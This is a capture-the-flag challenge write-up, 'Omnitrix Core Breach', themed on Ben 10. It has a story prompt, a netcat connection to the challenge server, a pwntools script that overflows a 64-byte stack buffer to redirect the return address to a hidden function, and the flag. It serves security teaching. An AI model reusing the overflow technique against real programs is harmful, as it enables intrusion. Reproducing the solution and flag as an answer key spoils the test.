# Challenge 17

## Difficulty

Medium

## Title

Omnitrix Core Breach

## Description

Ben’s Omnitrix has started acting weird — it won’t allow any transformations. Suspiciously, the authorization module keeps rejecting his credentials, no matter what he types in.

Grandpa Max suspects foul play — maybe someone tampered with the firmware before leaving for the Null Void. Gwen pulled the system logs and found a strange binary labeled omnitrix.

> "This isn’t just a bug," she muttered. "Someone doesn't want Ben to transform."

Find a way into the core and unlock the transformation sequence. Somewhere inside the binary, the Omnitrix still remembers Ben. You just need to land at the exact right position to prove you're worthy.

Connect to the omnitrix console using:

```bash
nc omnitrix.cynox.aotfiesta25.tech 40213
```

## Files

- `omnitrix.c`: C source code for the challenge.
- `omnitrix`: Compiled binary for the challenge.

## Solution

Classic Buffer Overflow.

```python
from pwn import *

# Replace with the actual address of transform_into_xlr8
target_addr = p64(0x401196)

payload = b"A" * 64          # buffer
payload += b"B" * 8          # saved RBP
payload += target_addr       # return address

p = process("./omnitrix")
p.sendline(payload)
p.interactive()
```

## Flag

```text
cyn0x{h3_wh0_0v3rfl0ws_th3_st4ck_g41ns_0mn1tr1x_c0ntr0l}
```
